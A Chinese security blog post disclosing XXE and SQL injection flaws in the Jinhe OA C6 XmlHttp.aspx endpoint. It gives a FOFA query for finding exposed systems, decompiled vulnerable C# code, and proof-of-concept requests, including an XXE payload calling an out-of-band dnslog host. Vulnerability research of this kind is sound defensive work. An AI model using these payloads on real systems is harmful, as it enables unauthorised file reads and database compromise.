---
title: "金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-dailytaskmanage-XmlHttp-xxe-sqli.html
asset_dir: assets/金和oa-dailytaskmanagexmlhttp.aspx-xxe漏洞+sql注入漏洞
---

# 金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/12 08:11
* 659浏览
* [0评论](#comment)
* 1小时阅读

深入探索

企业安全咨询

漏洞预警服务

Web安全书籍


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Jhsoft.Web.dailytaskmanage/XmlHttp.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

服务器安全服务

网络安全会议

编程语言教程

直接根据 XmlHttp.aspx 在 bin 目录下查找 `JHSoft.Web.DailyTaskManage.dll` 将其进行反编译后找到 `XmlHttp` 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.PageInit();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.Load(this.Request.InputStream);
  switch (xmlDocument.SelectSingleNode("//root//Flag").InnerText)
  {
    case "MyExecution":
      this.GetMyTask("MyExecution");
      break;
    case "MyAssignment":
      this.GetMyTask("MyAssignment");
      break;
    case "GetTaskOEC":
      string innerText1 = xmlDocument.SelectSingleNode("//root//TaskID").InnerText;
      string innerText2 = xmlDocument.SelectSingleNode("//root//TermType").InnerText;
      if (string.op_Equality(innerText2, "Month"))
      {
        this.GetMonthTaskOEC(innerText1);
        break;
      }
      if (string.op_Equality(innerText2, "Week"))
      {
        this.GetWeekTaskOEC(innerText1);
        break;
      }
      this.GetCustomTaskOEC(innerText1);
      break;
    case "GetSeedTask":
      string innerText3 = xmlDocument.SelectSingleNode("//root//Module").InnerText;
      string innerText4 = xmlDocument.SelectSingleNode("//root//ID").InnerText;
      string innerText5 = xmlDocument.SelectSingleNode("//root//TaskSort").InnerText;
      string innerText6 = xmlDocument.SelectSingleNode("//root//UserCode").InnerText;
      string innerText7 = xmlDocument.SelectSingleNode("//root//Permission").InnerText;
      if (string.op_Equality(innerText3.ToLower(), "task"))
      {
        this.GetSeedTask(xmlDocument, innerText4, innerText5, innerText6, innerText7);
        break;
      }
      this.GetModuleTask(innerText3, innerText4, innerText5, innerText6, innerText7);
      break;
    case "GetTaskRootScale":
      this.GetTaskRootScale(xmlDocument.SelectSingleNode("//root//TaskID").InnerText, xmlDocument.SelectSingleNode("//root//TempID").InnerText);
      break;
    case "GetTaskExecInfo":
      this.GetExecInfo(xmlDocument.SelectSingleNode("//root//TaskExecs").InnerText, xmlDocument.SelectSingleNode("//root//TaskOthers").InnerText, xmlDocument.SelectSingleNode("//root//SubUser").InnerText);
      break;
    case "GetTaskOriginInfo":
      this.GetTaskOriginInfo(xmlDocument.SelectSingleNode("//root//Module").InnerText, xmlDocument.SelectSingleNode("//root//ModuleID").InnerText);
      break;
    case "SelTaskOriginInfo":
      this.SelTaskOriginInfo(xmlDocument.SelectSingleNode("//root//Module").InnerText, xmlDocument.SelectSingleNode("//root//ModuleID").InnerText);
      break;
    case "CheckTask":
      this.CheckTaskStatus(xmlDocument.SelectSingleNode("//root//TaskID").InnerText);
      break;
  }
}
```

请求内容直接使 `xmlDocument.Load` 加载处理，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

根据 `Flag` 的值不同做不同的处理，当 其值为 `GetTaskOEC` 时，`TaskID` 和 `TermType` 的值分别带入不同的方法以及判断上。

当 `TermType` 不等于 `Month` 或 `Week` 时，跟进 `GetCustomTaskOEC` 方法

```
private void GetCustomTaskOEC(string strTaskID)
{
  string empty1 = string.Empty;
  string empty2 = string.Empty;
  StringBuilder stringBuilder = new StringBuilder();
  int int16 = (int) Convert.ToInt16(Common.ExecSqlReDt($" select DATEDIFF(day,TaskStartTime , TaskEndTime) as diff from TaskManage where TaskID = '{strTaskID}' ").Rows[0][0].ToString());
  string sql = int16 < 3 || int16 > 10 ? (int16 <= 10 ? string.Empty : $" select  DPlanItem.* from DPlanItem inner join DPlan on DPlanItem.DPlanID = DPlan.DPlanID where  DPlan.DPlanTaskID = '{strTaskID}'  ") : $" select  ZPlanItem.* from ZPlanItem inner join ZPlan on ZPlanItem.ZPlanID = ZPlan.ZPlanID where  ZPlan.ZPlanTaskID = '{strTaskID}'   ";
  string str1;
  if (string.op_Inequality(sql, string.Empty))
  {
    DataTable dataTable = Common.ExecSqlReDt(sql);
```

参数 `strTaskID` 被直接拼接进 `ExecSqlReDt` SQL语句中执行，无任何过滤或校验，导致[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

否则根据 TermType 的值分别进入 `GetMonthTaskOEC` 方法

```
private void GetMonthTaskOEC(string strTaskID)
{
  string empty1 = string.Empty;
  string empty2 = string.Empty;
  StringBuilder stringBuilder = new StringBuilder();
  DataTable dataTable = Common.ExecSqlReDt($" select  DPlanItem.* from DPlanItem inner join DPlan on DPlanItem.DPlanID = DPlan.DPlanID where  DPlan.DPlanTaskID = '{strTaskID}'  ");
  string str1;
  if (((InternalDataCollectionBase) dataTable.Rows).Count > 0)
  {
```

以及 `GetWeekTaskOEC` 方法

```
private void GetWeekTaskOEC(string strTaskID)
{
  string empty1 = string.Empty;
  string empty2 = string.Empty;
  StringBuilder stringBuilder = new StringBuilder();
  DataTable dataTable = Common.ExecSqlReDt($" select  ZPlanItem.* from ZPlanItem inner join ZPlan on ZPlanItem.ZPlanID = ZPlan.ZPlanID where  ZPlan.ZPlanTaskID = '{strTaskID}'   ");
  string str1;
  if (((InternalDataCollectionBase) dataTable.Rows).Count > 0)
  {
```

其他几个方法`CheckTaskStatus`、`SelTaskOriginInfo`、`GetTaskOriginInfo`、`GetTaskRootScale`和`GetModuleTask`也同样存在直接拼接 `strTaskID` 参数进入SQL语句中，同样也造成[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。

```
public void CheckTaskStatus(string strTaskID)
{
  string empty = string.Empty;
  DataTable dataTable = Common.ExecSqlReDt($"select top 1 * from TaskManage where TaskID = '{strTaskID}'");
  string str;
  public string GetTaskOriginInfo(string strOriginModule, string strOriginID, string strFlag)
  {
    this.InitText();
    string empty = string.Empty;
    string taskOriginInfo = string.Empty;
    if (string.op_Equality(strOriginModule.ToLower().ToString(), "unknown"))
    {
      DataTable dataTable = Common.ExecSqlReDt($" select OriginID,OriginModule from TaskManage where TaskID = '{strOriginID}'");
public string GetTaskOriginInfo(string strOriginModule, string strOriginID, string strFlag)
{
  this.InitText();
  string empty = string.Empty;
  string taskOriginInfo = string.Empty;
  if (string.op_Equality(strOriginModule.ToLower().ToString(), "unknown"))
  {
    DataTable dataTable = Common.ExecSqlReDt($" select OriginID,OriginModule from TaskManage where TaskID = '{strOriginID}'");
  public string GetExecInfo(string strExecs, string strOthers, string SubUser)
  {
    string empty = string.Empty;
    StringBuilder stringBuilder = new StringBuilder();
    if (string.op_Inequality(strExecs, string.Empty))
    {
      DataTable dataTable = Common.ExecSqlReDt($"select UserName,UserID from Users where UserID in ('{strExecs.Replace(",", "','")}')");
public void GetTaskRootScale(string strTaskID, string strTempID)
{
  string str = "100";
  DataTable dataTable = Common.ExecSqlReDt($" select TaskRootScale+isnull((select TaskScale  from TaskManage where TaskID = '{strTempID}' and TaskFatherID = '{strTaskID}'),0) as TaskRootScale from TaskManage where TaskID = '{strTaskID}'");
  if (((InternalDataCollectionBase) dataTable.Rows).Count > 0)
  public void GetModuleTask(
    string strModule,
    string strModuleID,
    string strFlag,
    string strUserCode,
    string strPermission)
  {
    DataTable dataTable = Common.ExecSqlReDt($" select a.TaskID,a.TaskNumber,a.TaskName,b.UserName as SendName,dbo.Fn_GetUserName(a.TaskExecutorID) as ExecName,a.TaskProgress,a.TaskFinishFlag,convert(varchar,TaskStartTime,23) + '～' + convert(varchar,TaskEndTime,23) as TaskSchedule,a.TaskRootScale {$" ,case when {$" ','+a.TaskExecutorID+',' like '%,{strUserCode},%' "} or {$" a.TaskSendPersonID = '{strUserCode}' "} or {$" ','+a.TaskViewRegCode+',' like '%,{strUserCode},%' "} then 1 else 0 end  as HasPermission "} ,case when exists(select TaskID from TaskManage where TaskFatherID = a.TaskID and TaskIsDel = 0 and TaskFinishFlag <> 2) then 1 else 0 end as HasChild  from TaskManage a inner join Users b on a.TaskSendPersonID = b.UserID  {$"\tand a.TaskNumber in ( select distinct substring(TaskNumber,0,8) as TaskNumber from TaskManage a where OriginModule='{strModule}' and OriginID='{strModuleID}'  and TaskIsDel = 0 ) "}");
    StringBuilder stringBuilder = new StringBuilder();
    string str = string.Empty;
```

# 漏洞复现

## XXE

```
POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.dnslog.pt/xxe_test">
%remote;]>
<root/>
```

成功在dnslog平台收到DNS请求和HTTP请求

[![金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-001-a3ff67592362.webp)](https://image.mrxn.net/e39e9ee505e7449e8f92bd98c024bb35.webp)

## SQL注入

```
POST /c6/Jhsoft.Web.dailytaskmanage/XmlHttp.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<root><Flag>CheckTask</Flag><TaskID>SQLI_POC</TaskID></root>
```

[![金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞](images/img-002-c08f7c499a78.webp)](https://image.mrxn.net/cd4dc186409247168f5e67897a1a2d44.webp)

成功延时 5 秒钟

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [5.1.XXE](#toc-5-1-)
* [5.2.SQL注入](#toc-5-2-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA dailytaskmanage/XmlHttp.aspx XXE漏洞+SQL注入漏洞](https://mrxn.net/jswz/jhsoft-dailytaskmanage-XmlHttp-xxe-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-dailytaskmanage-XmlHttp-xxe-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-dailytaskmanage-XmlHttp-xxe-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
